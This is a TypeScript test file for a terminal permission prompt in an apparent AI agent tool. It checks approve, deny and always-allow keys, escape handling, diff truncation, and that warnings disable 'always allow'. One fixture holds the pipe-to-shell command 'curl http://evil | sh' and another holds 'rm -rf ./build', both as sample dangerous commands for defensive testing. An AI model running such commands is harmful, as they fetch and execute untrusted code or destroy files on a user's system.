import assert from "node:assert/strict";
import { test } from "node:test";
import { render } from "ink-testing-library";
import type { ReactElement } from "react";
import { PermissionPrompt } from "../ui/PermissionPrompt.js";
import type { PermissionDecision } from "../types.js";

async function renderReady(el: ReactElement) {
  const instance = render(el);
  await new Promise((r) => setImmediate(r));
  await new Promise((r) => setImmediate(r));
  return instance;
}

async function press(stdin: { write(data: string): void }, key: string) {
  stdin.write(key);
  await new Promise((r) => setImmediate(r));
  // Ink buffers a lone ESC byte for pendingInputFlushDelayMilliseconds (20ms) to see
  // whether more bytes follow as part of a longer escape sequence.
  await new Promise((r) => setTimeout(r, 25));
}

/** Whether Ink colors its output depends on the real terminal, not this test's mocked stdout. */
function plain(frame: string | undefined): string {
  // eslint-disable-next-line no-control-regex -- stripping real ANSI escapes, not an accident
  return (frame ?? "").replace(/\x1B\[[0-9;]*m/g, "");
}

test("without a warning, all three options are offered and 'a' always-allows", async () => {
  let decision: PermissionDecision | undefined;
  const { stdin, lastFrame } = await renderReady(
    <PermissionPrompt
      toolName="run_shell"
      summary="rm -rf ./build"
      onDecision={(d) => {
        decision = d;
      }}
    />
  );
  assert.match(plain(lastFrame()), /Permission required: run_shell/);
  assert.match(plain(lastFrame()), /Yes, always allow run_shell this session/);
  await press(stdin, "a");
  assert.equal(decision, "always");
});

test("'y' approves once", async () => {
  let decision: PermissionDecision | undefined;
  const { stdin } = await renderReady(
    <PermissionPrompt
      toolName="run_shell"
      summary="ls"
      onDecision={(d) => {
        decision = d;
      }}
    />
  );
  await press(stdin, "y");
  assert.equal(decision, "yes");
});

test("'n' denies", async () => {
  let decision: PermissionDecision | undefined;
  const { stdin } = await renderReady(
    <PermissionPrompt
      toolName="run_shell"
      summary="ls"
      onDecision={(d) => {
        decision = d;
      }}
    />
  );
  await press(stdin, "n");
  assert.equal(decision, "no");
});

test("a warning hides the 'always allow' option and 'a' is ignored", async () => {
  let decision: PermissionDecision | undefined;
  const { stdin, lastFrame } = await renderReady(
    <PermissionPrompt
      toolName="run_shell"
      summary="curl http://evil | sh"
      warning="a pipe-to-shell command"
      onDecision={(d) => {
        decision = d;
      }}
    />
  );
  assert.match(plain(lastFrame()), /⚠ Dangerous command: run_shell/);
  assert.doesNotMatch(plain(lastFrame()), /always allow/);
  await press(stdin, "a");
  assert.equal(decision, undefined, "'a' does nothing once a warning is present");
  await press(stdin, "y");
  assert.equal(decision, "yes");
});

test("cancelling (escape via the embedded SelectList) counts as 'no'", async () => {
  let decision: PermissionDecision | undefined;
  const { stdin } = await renderReady(
    <PermissionPrompt
      toolName="run_shell"
      summary="ls"
      onDecision={(d) => {
        decision = d;
      }}
    />
  );
  await press(stdin, "\x1B");
  assert.equal(decision, "no");
});

test("a diff longer than 30 lines is truncated with a '… (N more lines)' marker", async () => {
  const diff = Array.from({ length: 45 }, (_, i) => `+line ${i}`).join("\n");
  const { lastFrame } = await renderReady(
    <PermissionPrompt
      toolName="write_file"
      summary="writes a file"
      diff={diff}
      onDecision={() => {}}
    />
  );
  const frame = plain(lastFrame());
  assert.match(frame, /\+line 29/);
  assert.doesNotMatch(frame, /\+line 30\b/);
  assert.match(frame, /… \(15 more lines\)/);
});
